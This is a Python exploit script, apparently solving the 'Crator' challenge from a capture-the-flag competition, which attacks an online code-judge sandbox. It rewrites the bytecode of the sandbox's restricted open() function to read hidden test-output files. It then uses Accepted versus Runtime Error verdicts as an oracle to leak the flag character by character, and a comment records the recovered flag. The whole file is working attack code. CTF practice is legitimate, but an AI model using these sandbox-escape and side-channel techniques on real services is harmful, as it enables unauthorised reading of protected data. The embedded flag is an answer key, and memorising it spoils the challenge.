import requests
import re
import secrets

s = requests.Session()

username = secrets.token_hex()
password = secrets.token_hex()

#url = "http://127.0.0.1:1337/"
url = "https://crator-d301f00b078ccd06.instancer.idek.team/"
r = s.post(url + 'register', data={'username': username, 'password': password})
r = s.post(url + 'login', data={'username': username, 'password': password})

# get next submission id
r = s.get(url + 'submissions')
max_submission = max([0] + list(map(int, re.findall(r'/submission/(\d+)', r.text))))
print(max_submission)

alphabet = 'abcdefghijklmnopqrstuvwxyz'
alphabet += alphabet.upper()
alphabet += '1234567890_-+={}'
submission_id = max_submission+1
#known = 'idek{1m4g1n3_n0t_h4v1ng_pr0p3r_s4ndb0x1ng}'
known = 'idek{'
while True:
    for guess_char in alphabet:
        print("trying", guess_char)
        code = f'''bytecode = open.__code__.co_code
bytecode = bytearray(bytecode)
bytecode[103] = 1 # patch constant loaded so we can load files ending with .expected
bytecode = bytes(bytecode)
open.__code__ = open.__code__.replace(co_code=bytecode)
with open('/tmp/{submission_id}.expected') as f:
    out = f.read().strip()
if out == 'Welcome to Crator':
    print(out)
elif out[{len(known)}] == '{guess_char}':
    raise Exception()
else:
    print(out)
    '''
        r = s.post(url + 'submit/helloinput', data={'code': code})
        submission_id += 1

        if """                <td>3</td>
                <td>(Output Hidden)</td>
                <td>(Output Hidden)</td>
                <td>Accepted</td>""" in r.text:
            # no match
            pass
        elif """                <td>3</td>
                <td>(Output Hidden)</td>
                <td>(Output Hidden)</td>
                <td>Runtime Error</td>""" in r.text:
            # match!
            print("Found char", guess_char)
            known += guess_char
            print(known)
            break
        else:
            print(r.text)
            exit(0)
